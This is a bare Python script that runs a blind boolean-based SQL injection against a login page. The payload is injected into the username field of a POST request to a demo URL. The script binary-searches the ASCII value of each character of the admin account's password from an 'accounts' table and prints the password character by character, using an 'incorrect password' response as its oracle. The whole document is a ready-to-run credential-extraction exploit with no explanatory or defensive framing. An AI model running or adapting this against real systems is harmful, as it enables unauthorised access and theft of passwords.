import requests, string

postData = "username=admin'%20and%20Ascii(substring((select%20password%20from%20accounts%20where%20username%20=%20'admin'%20limit%200,1),#,1))>#%20and%20'1'='1&password=admin"
seperator = '#'
url = "https://h.ack.green/demo/login.php"
expectedText = "incorrect password"
headers = {"Content-Type": "application/x-www-form-urlencoded","Authorization": "Basic c21hcnRhc3M="}
alphabet = range(0, 127)
up = len(alphabet)
low = 0
postData = postData.split(seperator)
result = ""
found = True
i = 1
idx = int((up - low) / 2)
while found:#For each character
	found = False
	first = True
	while True:#Binary sort loop
		if first:#check for most common characters first.
			first = False
			rPostData = postData[0] + str(i) + ",1))=32" + postData[2]#A space ' ', as this is common in config files
			r = requests.post(url, data=rPostData, headers=headers)
			if expectedText in r.text:
				print(str(chr(32)), end='', flush=True)
				i += 1
				found = True
				break
			rPostData = postData[0] + str(i) + ",1))=9" + postData[2]#A tab '	', as this is common in source code files
			r = requests.post(url, data=rPostData, headers=headers)
			if expectedText in r.text:
				print(str(chr(9)), end='', flush=True)
				i += 1
				found = True
				break

		#Binary sort
		rPostData = postData[0] + str(i) + postData[1] + str(alphabet[idx]) + postData[2]
		r = requests.post(url, data=rPostData, headers=headers)
		if expectedText in r.text:
			low = idx
		else:
			up = idx
		idx = int((up - low) / 2 + low)
		if up - low == 1:
			rPostData = postData[0] + str(i) + ",1))=" + str(alphabet[up]) + postData[2]
			r = requests.post(url, data=rPostData, headers=headers)
			if expectedText in r.text:
				print(str(chr(alphabet[up])), end='', flush=True)
				up = len(alphabet)
				low = 0
				idx = int((up - low) / 2)
				i += 1
				found = True
			break
